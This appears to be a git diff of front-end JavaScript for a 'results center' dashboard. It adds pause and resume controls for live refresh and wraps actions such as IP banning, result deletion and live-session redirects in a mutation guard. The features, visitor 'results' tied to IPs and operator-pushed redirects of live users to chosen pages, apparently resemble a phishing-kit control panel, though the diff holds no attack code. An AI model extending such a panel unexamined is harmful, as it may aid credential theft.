@@ -138,6 +138,9 @@ const resultsAutoRefreshMs = 5000;
 let resultsAutoRefreshTimer = null;
 let resultsAutoRefreshSlug = "";
 let resultsAutoRefreshBusy = false;
+let resultsAutoRefreshPromise = null;
+let resultsAutoRefreshUserPaused = false;
+let resultsMutationBusy = false;
 let resultNotificationAudioContext = null;
 let activeResultViewer = null;
 
@@ -285,19 +288,74 @@ function isResultsRoute(pageSlug = "") {
   return hash.startsWith("#results-") && (!pageSlug || hash.replace("#results-", "") === pageSlug);
 }
 
-function stopResultsAutoRefresh() {
+function resultsAutoRefreshBlockReason() {
+  if (document.visibilityState === "hidden") return "hidden";
+  if (resultsMutationBusy) return "mutation";
+  if (activeResultViewer) return "viewer";
+  const center = preview.querySelector(".compact-results-center");
+  if (!center) return "";
+  if (center.querySelector("[data-result-select]:checked")) return "selection";
+  if (center.querySelector("[data-compact-session][open]")) return "session";
+  const activeElement = document.activeElement;
+  if (activeElement && center.contains(activeElement) && activeElement.matches("input, select, textarea")) return "interaction";
+  return "";
+}
+
+function updateResultsAutoRefreshStatus(reason = resultsAutoRefreshBlockReason()) {
+  const indicator = preview.querySelector("[data-results-live-status]");
+  const toggle = preview.querySelector("[data-toggle-results-auto-refresh]");
+  const interactionPaused = Boolean(reason && reason !== "hidden");
+  if (indicator) {
+    indicator.textContent = resultsAutoRefreshUserPaused
+      ? "Live updates paused"
+      : interactionPaused
+        ? "Paused while you work"
+        : resultsAutoRefreshBusy
+          ? "Updating results"
+          : "Live updates on";
+    indicator.classList.toggle("is-paused", resultsAutoRefreshUserPaused || interactionPaused);
+  }
+  if (toggle) {
+    toggle.textContent = resultsAutoRefreshUserPaused ? "Resume live" : "Pause live";
+    toggle.setAttribute("aria-pressed", resultsAutoRefreshUserPaused ? "true" : "false");
+  }
+}
+
+function stopResultsAutoRefresh({ resetUserPause = true } = {}) {
   if (resultsAutoRefreshTimer) {
     window.clearInterval(resultsAutoRefreshTimer);
   }
   resultsAutoRefreshTimer = null;
   resultsAutoRefreshSlug = "";
   resultsAutoRefreshBusy = false;
+  resultsAutoRefreshPromise = null;
+  resultsMutationBusy = false;
+  if (resetUserPause) resultsAutoRefreshUserPaused = false;
+}
+
+async function runResultsMutation(work) {
+  resultsMutationBusy = true;
+  updateResultsAutoRefreshStatus("mutation");
+  const pendingRefresh = resultsAutoRefreshPromise;
+  if (pendingRefresh) {
+    try {
+      await pendingRefresh;
+    } catch {
+      // The foreground action will load authoritative data after the mutation.
+    }
+  }
+  try {
+    return await work();
+  } finally {
+    resultsMutationBusy = false;
+    updateResultsAutoRefreshStatus();
+  }
 }
 
 function startResultsAutoRefresh(pageSlug) {
   if (!pageSlug || !isResultsRoute(pageSlug)) return;
   if (resultsAutoRefreshTimer && resultsAutoRefreshSlug === pageSlug) return;
-  stopResultsAutoRefresh();
+  stopResultsAutoRefresh({ resetUserPause: false });
   resultsAutoRefreshSlug = pageSlug;
   resultsAutoRefreshTimer = window.setInterval(async () => {
     if (resultsAutoRefreshBusy) return;
@@ -305,11 +363,25 @@ function startResultsAutoRefresh(pageSlug) {
       stopResultsAutoRefresh();
       return;
     }
+    if (resultsAutoRefreshUserPaused) {
+      updateResultsAutoRefreshStatus("manual");
+      return;
+    }
+    const blockReason = resultsAutoRefreshBlockReason();
+    if (blockReason) {
+      updateResultsAutoRefreshStatus(blockReason);
+      return;
+    }
     resultsAutoRefreshBusy = true;
+    updateResultsAutoRefreshStatus("");
+    const refreshPromise = renderResultsCenter(pageSlug, { autoRefresh: true });
+    resultsAutoRefreshPromise = refreshPromise;
     try {
-      await renderResultsCenter(pageSlug, { autoRefresh: true });
+      await refreshPromise;
     } finally {
+      if (resultsAutoRefreshPromise === refreshPromise) resultsAutoRefreshPromise = null;
       resultsAutoRefreshBusy = false;
+      updateResultsAutoRefreshStatus();
     }
   }, resultsAutoRefreshMs);
 }
@@ -5639,7 +5711,14 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
         .filter(Boolean)
     : [];
   await loadResultsControlData(page, options);
-  if (options.autoRefresh && !isResultsRoute(routeKey)) return;
+  if (options.autoRefresh) {
+    if (!isResultsRoute(routeKey)) return;
+    const blockReason = resultsAutoRefreshBlockReason();
+    if (blockReason) {
+      updateResultsAutoRefreshStatus(blockReason);
+      return;
+    }
+  }
   const results = page.results || [];
   const savedSessions = resultSessions(results);
   const activeSessions = page.activeSessions || [];
@@ -5689,7 +5768,8 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
             <h3>Compact sessions</h3>
           </div>
           <div class="compact-center-actions">
-            <span class="live-refresh-indicator" aria-live="polite">Auto-refresh 5s / ${pageTargets.length} mapped page${pageTargets.length === 1 ? "" : "s"}</span>
+            <span class="live-refresh-indicator${resultsAutoRefreshUserPaused ? " is-paused" : ""}" data-results-live-status aria-live="polite">${resultsAutoRefreshUserPaused ? "Live updates paused" : "Live updates on"}</span>
+            <button type="button" data-toggle-results-auto-refresh="${routeKey}" aria-pressed="${resultsAutoRefreshUserPaused ? "true" : "false"}">${resultsAutoRefreshUserPaused ? "Resume live" : "Pause live"}</button>
             <button type="button" data-refresh-results="${routeKey}">Refresh</button>
             <button type="button" data-sync-result-screens="${routeKey}" title="Replace this subscription snapshot with the package's current saved screen order">${page.screenSync?.stale ? "Sync updated pages" : "Sync package pages"}</button>
             <button type="button" data-route="#security-${routeKey}:traffic">Open traffic</button>
@@ -5757,6 +5837,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
   updateBulkResultsToolbar();
 
   startResultsAutoRefresh(routeKey);
+  updateResultsAutoRefreshStatus();
   statusText.textContent = options.autoRefresh ? `${page.name.toUpperCase()} RESULTS AUTO-REFRESHED` : `${page.name.toUpperCase()} RESULTS READY`;
   topbarTitle.textContent = `${page.name} Results`;
 }
@@ -7239,6 +7320,7 @@ preview.addEventListener("change", (event) => {
   const resultSelection = event.target.closest("[data-result-select]");
   if (resultSelection) {
     updateBulkResultsToolbar();
+    updateResultsAutoRefreshStatus();
     return;
   }
 
@@ -7284,6 +7366,7 @@ preview.addEventListener("input", (event) => {
   }
   if (event.target.closest("[data-session-search-input]")) {
     applyCompactSessionFilters();
+    updateResultsAutoRefreshStatus("interaction");
   }
   if (event.target.closest('[data-wallet-fund="amount"]')) {
     scheduleWalletFundingQuote();
@@ -7678,9 +7761,22 @@ preview.addEventListener("click", async (event) => {
     const action = toolbar?.querySelector("[data-bulk-results-action]")?.value || "review";
     const resultIds = selectedResultIds();
     try {
-      await withButtonBusy(applyBulkResultsButton, "Applying", () => applyBulkResults(page, action, resultIds));
+      await withButtonBusy(applyBulkResultsButton, "Applying", () => runResultsMutation(() => applyBulkResults(page, action, resultIds)));
     } catch (error) {
       statusText.textContent = `BULK ACTION FAILED: ${error.message}`.toUpperCase();
+    }
+    return;
+  }
+
+  const toggleResultsAutoRefreshButton = event.target.closest("[data-toggle-results-auto-refresh]");
+  if (toggleResultsAutoRefreshButton) {
+    resultsAutoRefreshUserPaused = !resultsAutoRefreshUserPaused;
+    if (resultsAutoRefreshUserPaused) {
+      updateResultsAutoRefreshStatus("manual");
+      statusText.textContent = "LIVE RESULT UPDATES PAUSED";
+    } else {
+      await withButtonBusy(toggleResultsAutoRefreshButton, "Resuming", () => renderResultsCenter(toggleResultsAutoRefreshButton.dataset.toggleResultsAutoRefresh));
+      statusText.textContent = "LIVE RESULT UPDATES RESUMED";
     }
     return;
   }
@@ -7700,7 +7796,7 @@ preview.addEventListener("click", async (event) => {
       return;
     }
     try {
-      await withButtonBusy(syncResultScreensButton, "Syncing", async () => {
+      await withButtonBusy(syncResultScreensButton, "Syncing", () => runResultsMutation(async () => {
         const result = await requestApi(`/api/user-pages/${resultPage.id}/screens/sync`, { method: "POST" });
         const updated = normalizeUserPage({
           ...result.userPage,
@@ -7710,7 +7806,7 @@ preview.addEventListener("click", async (event) => {
         });
         ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
         await renderResultsCenter(pageRouteKey(updated));
-      });
+      }));
       statusText.textContent = "PACKAGE SCREEN ORDER SYNCED";
     } catch (error) {
       statusText.textContent = `SCREEN SYNC FAILED: ${error.message}`.toUpperCase();
@@ -7861,7 +7957,7 @@ preview.addEventListener("click", async (event) => {
       statusText.textContent = "MAPPED PACKAGE PAGE REQUIRED";
       return;
     }
-    await withButtonBusy(sessionRedirectButton, "Redirecting", async () => {
+    await withButtonBusy(sessionRedirectButton, "Redirecting", () => runResultsMutation(async () => {
       const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
         method: "POST",
         body: JSON.stringify({ targetFile, forceReload })
@@ -7870,11 +7966,7 @@ preview.addEventListener("click", async (event) => {
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
       await renderResultsCenter(pageRouteKey(updated));
       statusText.textContent = "LIVE USER REDIRECT QUEUED";
-      window.setTimeout(() => {
-        const latest = getPageBySlug(pageRouteKey(updated));
-        if (latest) renderResultsCenter(pageRouteKey(updated));
-      }, 5500);
-    }).catch((error) => {
+    })).catch((error) => {
       statusText.textContent = `REDIRECT FAILED: ${error.message}`.toUpperCase();
     });
     return;
@@ -7886,7 +7978,7 @@ preview.addEventListener("click", async (event) => {
     const resultPage = getPageBySlug(sessionClearButton.dataset.sessionPage);
     const sessionId = sessionClearButton.dataset.sessionClear;
     if (!resultPage) return;
-    await withButtonBusy(sessionClearButton, "Clearing", async () => {
+    await withButtonBusy(sessionClearButton, "Clearing", () => runResultsMutation(async () => {
       const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/command`, {
         method: "DELETE"
       });
@@ -7894,7 +7986,7 @@ preview.addEventListener("click", async (event) => {
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
       await renderResultsCenter(pageRouteKey(updated));
       statusText.textContent = "LIVE USER COMMAND CLEARED";
-    }).catch((error) => {
+    })).catch((error) => {
       statusText.textContent = `CLEAR FAILED: ${error.message}`.toUpperCase();
     });
     return;
@@ -7916,17 +8008,17 @@ preview.addEventListener("click", async (event) => {
     }
 
     if (resultAction.dataset.deleteResult) {
-      await withButtonBusy(resultAction, "Deleting", async () => {
+      await withButtonBusy(resultAction, "Deleting", () => runResultsMutation(async () => {
         await requestApi(`/api/user-pages/${resultPage.id}/results/${encodeURIComponent(result.id)}`, { method: "DELETE" });
         resultPage.results = resultPage.results.filter((item) => item.id !== result.id);
         await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = "RESULT DELETED";
-      });
+      }));
       return;
     }
 
     if (resultAction.dataset.banResultIp) {
-      await withButtonBusy(resultAction, "Banning", async () => {
+      await withButtonBusy(resultAction, "Banning", () => runResultsMutation(async () => {
         const updated = await requestApi(`/api/user-pages/${resultPage.id}/ban-ip`, {
           method: "POST",
           body: JSON.stringify({ ip: result.ip })
@@ -7934,12 +8026,12 @@ preview.addEventListener("click", async (event) => {
         applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
         await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = `${result.ip} BANNED`;
-      });
+      }));
       return;
     }
 
     if (resultAction.dataset.whitelistResultIp) {
-      await withButtonBusy(resultAction, "Trusting", async () => {
+      await withButtonBusy(resultAction, "Trusting", () => runResultsMutation(async () => {
         const updated = await requestApi(`/api/user-pages/${resultPage.id}/whitelist-ip`, {
           method: "POST",
           body: JSON.stringify({ ip: result.ip })
@@ -7947,12 +8039,15 @@ preview.addEventListener("click", async (event) => {
         applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
         await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = `${result.ip} WHITELISTED`;
-      });
+      }));
       return;
     }
   }
 
 });
+preview.addEventListener("toggle", (event) => {
+  if (event.target.matches?.("[data-compact-session]")) updateResultsAutoRefreshStatus();
+}, true);
 preview.addEventListener("dragstart", (event) => {
   const row = event.target.closest?.("[data-package-screen-row]");
   if (!row) return;
